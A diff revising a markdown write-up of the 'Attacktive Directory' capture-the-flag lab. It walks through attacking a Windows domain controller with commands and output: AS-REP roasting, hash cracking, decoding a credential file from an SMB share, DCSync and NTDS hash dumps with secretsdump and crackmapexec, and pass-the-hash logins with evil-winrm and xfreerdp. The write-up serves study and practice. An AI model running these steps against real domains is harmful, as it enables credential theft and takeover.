@@ -116,13 +116,11 @@ Interesting services found:
 * 88 (kerberos) Microsoft Windows Kerberos
 * 139 (netbios-ssn) Microsoft Windows netbios-ssn
 * 389,3268 (ldap) Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
-
+* 5985 (winrm)
 -----
 
-### Enumeratio service samba
-
 ## Enumerating Users via Kerberos
-smbclient — ftp-like client to access SMB/CIFS resources on servers
+smbclient: ftp-like client to access SMB/CIFS resources on servers
 
 | argument | description |
 | -------- | ----------- |
@@ -152,6 +150,9 @@ rpcclient $> enumdomusers
 result was NT_STATUS_ACCESS_DENIED
 rpcclient $>
 ```
+
+-----
+
 ## AS-REP roasting
 ASReproasting occurs when a user account has the **No prior authentication required** privilege set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.
 
@@ -248,7 +249,7 @@ $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:5074d38e8727870e0a5716559eee4785$56dab19
 
 ```
 
-### Joh The Ripper
+### John The Ripper
 
 ```
 ❯ john hash --wordlist=passwordlist.txt
@@ -292,7 +293,15 @@ SMB         10.10.28.119    445    ATTACKTIVEDIREC  [+] spookysec.local\svc-admi
         SYSVOL          Disk      Logon server share
 ```
 
-##### SMB mount
+#### SMB mount
+mount: mount a filesystem
+
+| argument | description                  |
+| -------- | ---------------------------- |
+| -t       | indicate the filesystem type |
+| -o       | options                      |
+
+> For more information: man mount
 
 ```
 ❯ sudo mkdir /mnt/samba
@@ -306,11 +315,7 @@ We found another user
 
 ```
 ❯ cat /mnt/samba/backup_credentials.txt
-───────┬────────────────────────────────────────────────────────────────────
-       │ File: /mnt/samba/backup_credentials.txt
-───────┼────────────────────────────────────────────────────────────────────
-   1   │ YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
-───────┴────────────────────────────────────────────────────────────────────
+YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
 
 ❯ echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw"|base64 -d; echo
 backup@spookysec.local:backup2517860
@@ -429,27 +434,14 @@ rpcclient $> queryuser 0x641
         logon_hrs[0..21]...
 ```
 
-> enumdomusers
-
-> enumdomgroups
-
-> querygroupmem
-
 ------
 
 ## DCSync Attack
+The DCSync permission implies having these permissions over the domain itself: DS-Replication-Get-Changes, Replicating Directory Changes All and Replicating Directory Changes In Filtered Set.
 
-```
-❯ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py spookysec.local/svc-admin:management2005@10.10.28.119
-Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+More information: [https://book.hacktricks.xyz/windows/active-directory-methodology/dcsync](https://book.hacktricks.xyz/windows/active-directory-methodology/dcsync)
 
-[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
-[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-[*] Using the DRSUAPI method to get NTDS.DIT secrets
-[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
-[*] Something wen't wrong with the DRSUAPI approach. Try again with -use-vss parameter
-[*] Cleaning up...
-```
+![dcsync](/assets/imgs/attacktive-directory/dcsync.PNG)
 
 ```
 ❯ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py spookysec.local/backup:backup2517860@10.10.28.119
@@ -538,15 +530,22 @@ ATTACKTIVEDIREC$:des-cbc-md5:1625a7264c8a32b6
 ❯ crackmapexec smb spookysec.local -u "a-spooks" -H "0e0363213e37b94221497260b0bcb4fc"
 SMB         10.10.28.119   445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
 SMB         10.10.28.119   445    ATTACKTIVEDIREC  [+] spookysec.local\a-spooks 0e0363213e37b94221497260b0bcb4fc (Pwn3d!)
-
 ```
 
 -----
 
 ## Evil-winrm
+This program can be used on any Microsoft Windows server with this feature enabled (usually on port 5985), of course, only if you have credentials and permissions to use it. The purpose of this program is to provide nice and easy to use hacking features.
+
 Evil-winrm installation.
 
 > gem install evil-winrm
+
+| argument  | description        |
+| --------- | ------------------ |
+| -i | ip machine or domain name |
+| -u | user                      |
+| -H | hash                      |
 
 ```
 ❯ evil-winrm -i spookysec.local -u "a-spooks" -H "0e0363213e37b94221497260b0bcb4fc"
@@ -575,7 +574,14 @@ Ethernet adapter Ethernet:
    Default Gateway . . . . . . . . . : 10.10.0.1
 ```
 
+-----
+
+## what is NTDS?
+NTDS stands for New Technologies Directory Services and DIT stands for Directory Information Tree. You can find NTDS file at “C:\Windows\NTDS”. This file acts as a database for Active Directory and stores all its data including all the credentials. The Default size of Ntds.dit is 12 MB which can be extended up to 16TB.
+
 ### crackmapexec ntds
+
+> syntax : crackmapexec <protocol> <IP> -u <user_name> -H <hash> --ntds vss
 
 ```
 ❯ crackmapexec smb spookysec.local -u "a-spooks" -H "0e0363213e37b94221497260b0bcb4fc" --ntds vss
@@ -655,6 +661,9 @@ SMB         10.10.28.119   445    ATTACKTIVEDIREC  [+] Dumped 69 NTDS hashes to 
 ```
 
 ### secretsdump
+ secretsdump.py file from the impacket toolkit to extract hashes.
+
+> syntax : secretsdump.py <domain_name>/<user>:<password>@<IP>
 
 ```
 ❯ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py spookysec.local/backup:backup2517860@10.10.28.119
@@ -742,6 +751,7 @@ ATTACKTIVEDIREC$:des-cbc-md5:1625a7264c8a32b6
 Trying to connect via remote desktop. I was able to find that the machine has specified certain policies for which it is not possible.
 
 > ❯ xfreerdp /u:Administrator /pth:0e0363213e37b94221497260b0bcb4fc /v:10.10.191.145
+
 > ❯ xfreerdp /u:a-spooks /pth:0e0363213e37b94221497260b0bcb4fc /v:10.10.191.145
 
 ![desktop](/assets/imgs/attacktive-directory/desktop.png)
